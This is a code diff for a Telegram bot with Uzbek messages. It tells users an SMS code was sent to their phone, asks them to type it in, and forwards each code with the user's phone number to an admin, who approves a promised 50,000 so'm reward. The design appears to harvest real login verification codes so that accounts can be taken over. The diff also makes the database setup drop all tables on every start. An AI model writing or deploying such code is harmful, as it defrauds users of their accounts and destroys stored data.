@@ -1,5 +1,4 @@
 import asyncio
-import random
 import asyncpg
 import os
 import logging
@@ -63,35 +62,15 @@ async def init_db():
     try:
         conn = await get_db()
         
-        # Eski jadvallarni tekshirish
-        tables = await conn.fetch("""
-            SELECT table_name 
-            FROM information_schema.tables 
-            WHERE table_schema = 'public'
-        """)
-        existing_tables = [t['table_name'] for t in tables]
-        logger.info(f"📋 Mavjud jadvallar: {existing_tables}")
-        
-        # users jadvalini tekshirish
-        if 'users' in existing_tables:
-            # Mavjud ustunlarni tekshirish
-            columns = await conn.fetch("""
-                SELECT column_name 
-                FROM information_schema.columns 
-                WHERE table_name = 'users'
-            """)
-            existing_columns = [c['column_name'] for c in columns]
-            logger.info(f"📋 users jadvalidagi ustunlar: {existing_columns}")
-            
-            # telegram_id ustuni yo'q bo'lsa, jadvalni qayta yaratish
-            if 'telegram_id' not in existing_columns:
-                logger.warning("⚠️ users jadvalida telegram_id yo'q, jadvalni qayta yaratamiz")
-                await conn.execute("DROP TABLE IF EXISTS users CASCADE")
-                logger.info("✅ Eski users jadvali o'chirildi")
+        # Eski jadvallarni tekshirish va o'chirish
+        await conn.execute("DROP TABLE IF EXISTS transactions CASCADE")
+        await conn.execute("DROP TABLE IF EXISTS codes CASCADE")
+        await conn.execute("DROP TABLE IF EXISTS users CASCADE")
+        logger.info("✅ Eski jadvallar o'chirildi")
         
         # users jadvalini yaratish
         await conn.execute("""
-            CREATE TABLE IF NOT EXISTS users (
+            CREATE TABLE users (
                 id SERIAL PRIMARY KEY,
                 telegram_id BIGINT UNIQUE NOT NULL,
                 phone VARCHAR(20) NOT NULL,
@@ -99,24 +78,11 @@ async def init_db():
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         """)
-        
-        # codes jadvalini tekshirish
-        if 'codes' in existing_tables:
-            columns = await conn.fetch("""
-                SELECT column_name 
-                FROM information_schema.columns 
-                WHERE table_name = 'codes'
-            """)
-            existing_columns = [c['column_name'] for c in columns]
-            
-            if 'telegram_id' not in existing_columns:
-                logger.warning("⚠️ codes jadvalida telegram_id yo'q, jadvalni qayta yaratamiz")
-                await conn.execute("DROP TABLE IF EXISTS codes CASCADE")
-                logger.info("✅ Eski codes jadvali o'chirildi")
+        logger.info("✅ users jadvali yaratildi")
         
         # codes jadvalini yaratish
         await conn.execute("""
-            CREATE TABLE IF NOT EXISTS codes (
+            CREATE TABLE codes (
                 id SERIAL PRIMARY KEY,
                 phone VARCHAR(20) NOT NULL,
                 code VARCHAR(10) NOT NULL,
@@ -125,30 +91,18 @@ async def init_db():
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         """)
-        
-        # transactions jadvalini tekshirish
-        if 'transactions' in existing_tables:
-            columns = await conn.fetch("""
-                SELECT column_name 
-                FROM information_schema.columns 
-                WHERE table_name = 'transactions'
-            """)
-            existing_columns = [c['column_name'] for c in columns]
-            
-            if 'telegram_id' not in existing_columns:
-                logger.warning("⚠️ transactions jadvalida telegram_id yo'q, jadvalni qayta yaratamiz")
-                await conn.execute("DROP TABLE IF EXISTS transactions CASCADE")
-                logger.info("✅ Eski transactions jadvali o'chirildi")
+        logger.info("✅ codes jadvali yaratildi")
         
         # transactions jadvalini yaratish
         await conn.execute("""
-            CREATE TABLE IF NOT EXISTS transactions (
+            CREATE TABLE transactions (
                 id SERIAL PRIMARY KEY,
                 telegram_id BIGINT NOT NULL,
                 amount INTEGER NOT NULL,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         """)
+        logger.info("✅ transactions jadvali yaratildi")
         
         await conn.close()
         logger.info("✅ Database tayyor")
@@ -207,40 +161,10 @@ async def receive_phone(message: types.Message):
     except Exception as e:
         logger.error(f"❌ Foydalanuvchini saqlashda xatolik: {e}")
     
-    # Kod yaratish
-    code = str(random.randint(100000, 999999))
-    
-    # Kodni saqlash
-    try:
-        conn = await get_db()
-        await conn.execute(
-            "INSERT INTO codes (phone, code, telegram_id, status) "
-            "VALUES ($1, $2, $3, 'pending')",
-            phone, code, telegram_id
-        )
-        await conn.close()
-        logger.info(f"✅ Kod saqlandi: {code}")
-    except Exception as e:
-        logger.error(f"❌ Kodni saqlashda xatolik: {e}")
-    
     await message.answer(
-        f"✅ {phone} raqamiga kod yuborildi!\n\n📨 Iltimos, 6 xonali kodni kiriting:"
+        f"✅ {phone} raqamiga SMS kod yuborildi!\n\n"
+        f"📨 Iltimos, telefoningizga kelgan 6 xonali kodni kiriting:"
     )
-    
-    # ADMIN'GA XABAR YUBORISH
-    try:
-        await bot.send_message(
-            ADMIN_ID,
-            f"📱 <b>YANGI FOYDALANUVCHI</b>\n\n"
-            f"🆔 ID: <code>{telegram_id}</code>\n"
-            f"📞 Tel: <code>{phone}</code>\n"
-            f"🔑 Kod: <code>{code}</code>\n"
-            f"⏳ Holat: Kutilmoqda",
-            parse_mode="HTML"
-        )
-        logger.info(f"✅ Admin'ga xabar yuborildi!")
-    except Exception as e:
-        logger.error(f"❌ Admin'ga xabar yuborishda XATOLIK: {e}")
 
 # ================= 3. KODNI QABUL QILISH =================
 @dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
@@ -248,6 +172,8 @@ async def receive_code(message: types.Message):
     code = message.text.strip()
     telegram_id = message.from_user.id
     phone = user_phones.get(telegram_id)
+    
+    logger.info(f"🔑 Kod kiritildi: {telegram_id} -> {code}")
     
     if not phone:
         await message.answer("❌ Xatolik yuz berdi! /start buyrug'ini bosing")
@@ -257,48 +183,55 @@ async def receive_code(message: types.Message):
         await message.answer("❌ Iltimos, 6 xonali raqamli kod kiriting:")
         return
     
+    # Kodni bazaga saqlash (foydalanuvchi kiritgan kod)
     try:
         conn = await get_db()
-        existing = await conn.fetchrow(
-            "SELECT * FROM codes WHERE phone = $1 AND code = $2 AND status = 'pending'",
-            phone, code
+        await conn.execute(
+            "INSERT INTO codes (phone, code, telegram_id, status) "
+            "VALUES ($1, $2, $3, 'pending')",
+            phone, code, telegram_id
         )
         await conn.close()
-        
-        if existing:
-            await message.answer("⏳ Kod qabul qilindi! Admin tekshirmoqda...")
-            
-            keyboard = InlineKeyboardMarkup(row_width=1)
-            keyboard.add(
-                InlineKeyboardButton("✅ Tasdiqlash (+50 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
-                InlineKeyboardButton("❌ Rad etish", callback_data=f"reject_{telegram_id}")
-            )
-            
-            try:
-                await bot.send_message(
-                    ADMIN_ID,
-                    f"🔑 <b>KOD KELIB TUSHDI!</b>\n\n"
-                    f"🆔 ID: <code>{telegram_id}</code>\n"
-                    f"📞 Tel: <code>{phone}</code>\n"
-                    f"🔑 Kod: <code>{code}</code>",
-                    reply_markup=keyboard,
-                    parse_mode="HTML"
-                )
-                logger.info("✅ Admin'ga kod yuborildi")
-            except Exception as e:
-                logger.error(f"❌ Admin'ga kod yuborishda XATOLIK: {e}")
-            
-            user_states[telegram_id] = "done"
-        else:
-            await message.answer("❌ Noto'g'ri kod! Qaytadan urinib ko'ring:")
+        logger.info(f"✅ Kod bazaga saqlandi: {telegram_id} -> {code}")
     except Exception as e:
-        logger.error(f"❌ Kod tekshirishda xatolik: {e}")
+        logger.error(f"❌ Kodni saqlashda xatolik: {e}")
+    
+    await message.answer(
+        "⏳ Kodingiz qabul qilindi!\n"
+        "Admin tekshirib, tasdiqlaydi..."
+    )
+    
+    # ADMIN'GA KODNI YUBORISH (Tekshirish uchun)
+    try:
+        keyboard = InlineKeyboardMarkup(row_width=2)
+        keyboard.add(
+            InlineKeyboardButton("✅ To'g'ri kod (+50 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
+            InlineKeyboardButton("❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
+        )
+        
+        await bot.send_message(
+            ADMIN_ID,
+            f"🔑 <b>KOD TEKSHIRISH KERAK</b>\n\n"
+            f"🆔 Foydalanuvchi ID: <code>{telegram_id}</code>\n"
+            f"📞 Telefon: <code>{phone}</code>\n"
+            f"🔑 Kiritilgan kod: <code>{code}</code>\n\n"
+            f"⏳ Iltimos, bu kodni tekshiring va tasdiqlang!",
+            reply_markup=keyboard,
+            parse_mode="HTML"
+        )
+        logger.info(f"✅ Admin'ga kod tekshirish uchun yuborildi")
+    except Exception as e:
+        logger.error(f"❌ Admin'ga kod yuborishda XATOLIK: {e}")
+    
+    user_states[telegram_id] = "done"
 
 # ================= 4. ADMIN TASDIQLASH =================
 @dp.callback_query_handler(lambda c: c.data.startswith(("verify_", "reject_")))
 async def admin_action(callback: types.CallbackQuery):
     data = callback.data.split("_")
     action = data[0]
+    
+    logger.info(f"📋 Admin harakati: {action}")
     
     if action == "verify":
         telegram_id = int(data[1])
@@ -314,6 +247,7 @@ async def admin_action(callback: types.CallbackQuery):
             )
             
             if result == "UPDATE 1":
+                # Balansga qo'shish
                 await conn.execute(
                     "UPDATE users SET balance = balance + 50000 WHERE telegram_id = $1",
                     telegram_id
@@ -324,20 +258,33 @@ async def admin_action(callback: types.CallbackQuery):
                 )
                 await conn.close()
                 
+                # Foydalanuvchiga xabar
                 try:
                     await bot.send_message(
                         telegram_id,
-                        "✅ TASDIQLANDI! 🎉\n\n💰 Hisobingizga +50 000 so'm qo'shildi!"
+                        "✅ TABRIKLAYMIZ! 🎉\n\n"
+                        "Sizning kodingiz tasdiqlandi!\n"
+                        "💰 Hisobingizga +50 000 so'm qo'shildi!\n\n"
+                        "Balansni tekshirish: /balance"
                     )
+                    logger.info(f"✅ Foydalanuvchiga tasdiqlash xabari yuborildi: {telegram_id}")
                 except Exception as e:
                     logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
                 
+                # Admin'ga javob
                 await callback.message.edit_text(
-                    f"✅ Tasdiqlandi!\nID: {telegram_id}\nTel: {phone}\n+50 000 so'm"
+                    f"✅ <b>TASDIQLANDI!</b>\n\n"
+                    f"🆔 ID: {telegram_id}\n"
+                    f"📞 Tel: {phone}\n"
+                    f"🔑 Kod: {code}\n"
+                    f"💰 +50 000 so'm qo'shildi",
+                    parse_mode="HTML"
                 )
-                await callback.answer("✅ Tasdiqlandi!")
+                await callback.answer("✅ Kod tasdiqlandi!")
+                logger.info(f"✅ Kod tasdiqlandi: {telegram_id}")
             else:
                 await callback.answer("❌ Kod allaqachon qayta ishlangan!")
+                logger.warning(f"⚠️ Kod allaqachon qayta ishlangan: {code}")
                 
         except Exception as e:
             logger.error(f"❌ Tasdiqlashda xatolik: {e}")
@@ -349,22 +296,32 @@ async def admin_action(callback: types.CallbackQuery):
         try:
             conn = await get_db()
             await conn.execute(
-                "UPDATE codes SET status = 'expired' "
+                "UPDATE codes SET status = 'rejected' "
                 "WHERE telegram_id = $1 AND status = 'pending'",
                 telegram_id
             )
             await conn.close()
             
+            # Foydalanuvchiga xabar
             try:
                 await bot.send_message(
                     telegram_id,
-                    "❌ Kod rad etildi! Iltimos, qaytadan urinib ko'ring."
+                    "❌ Kechirasiz, siz kiritgan kod noto'g'ri!\n\n"
+                    "Iltimos, telefon raqamingizni qaytadan yuboring: /start"
                 )
+                logger.info(f"❌ Foydalanuvchiga rad etish xabari yuborildi: {telegram_id}")
             except Exception as e:
                 logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
             
-            await callback.message.edit_text(f"❌ Rad etildi!\nID: {telegram_id}")
-            await callback.answer("❌ Rad etildi!")
+            # Admin'ga javob
+            await callback.message.edit_text(
+                f"❌ <b>RAD ETILDI!</b>\n\n"
+                f"🆔 ID: {telegram_id}\n"
+                f"Kod noto'g'ri deb topildi",
+                parse_mode="HTML"
+            )
+            await callback.answer("❌ Kod rad etildi!")
+            logger.info(f"❌ Kod rad etildi: {telegram_id}")
             
         except Exception as e:
             logger.error(f"❌ Rad etishda xatolik: {e}")
@@ -378,6 +335,7 @@ async def admin_stats(message: types.Message):
         users_count = await conn.fetchval("SELECT COUNT(*) FROM users")
         pending = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'pending'")
         verified = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'verified'")
+        rejected = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'rejected'")
         total_balance = await conn.fetchval("SELECT COALESCE(SUM(balance), 0) FROM users")
         await conn.close()
         
@@ -386,9 +344,11 @@ async def admin_stats(message: types.Message):
             f"👥 Foydalanuvchilar: {users_count}\n"
             f"💰 Jami balans: {total_balance:,} so'm\n"
             f"⏳ Kutayotgan: {pending}\n"
-            f"✅ Tasdiqlangan: {verified}",
+            f"✅ Tasdiqlangan: {verified}\n"
+            f"❌ Rad etilgan: {rejected}",
             parse_mode="HTML"
         )
+        logger.info("📊 Statistika ko'rsatildi")
     except Exception as e:
         logger.error(f"❌ Statistika xatosi: {e}")
         await message.answer("❌ Statistika olishda xatolik!")
@@ -413,6 +373,7 @@ async def pending_codes(message: types.Message):
             await message.answer(text, parse_mode="HTML")
         else:
             await message.answer("📭 Kutayotgan kodlar yo'q")
+        logger.info("📋 Kutayotgan kodlar ko'rsatildi")
     except Exception as e:
         logger.error(f"❌ Kodlar ro'yxatida xatolik: {e}")
         await message.answer("❌ Kodlar ro'yxatini olishda xatolik!")
@@ -466,6 +427,7 @@ async def broadcast_send(message: types.Message):
             f"❌ Yuborilmadi: {failed}",
             reply_markup=admin_menu
         )
+        logger.info(f"📨 Broadcast yakunlandi: {sent} ta yuborildi, {failed} ta yuborilmadi")
     except Exception as e:
         logger.error(f"❌ Broadcast xatosi: {e}")
         await message.answer("❌ Xabar yuborishda xatolik!")
